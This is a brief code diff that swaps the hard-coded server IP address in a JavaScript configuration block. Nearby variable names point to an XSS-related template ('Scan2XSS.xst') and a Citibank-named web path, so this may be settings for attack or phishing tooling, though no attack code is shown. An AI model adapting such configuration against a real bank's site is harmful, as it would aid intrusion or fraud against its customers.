@@ -21,7 +21,7 @@ var acctId = null;
 var acctType = null;
 
 var templateName = "Scan2XSS.xst";
-var serverAddr = "13.165.216.214:443";
+var serverAddr = "13.157.221.69:443";
 var documentPath = "/inetpub/wwwroot/HTTPS/Citibank";
 var HTTPSscriptLocation = "/HTTPS/xerox.ashx";
 
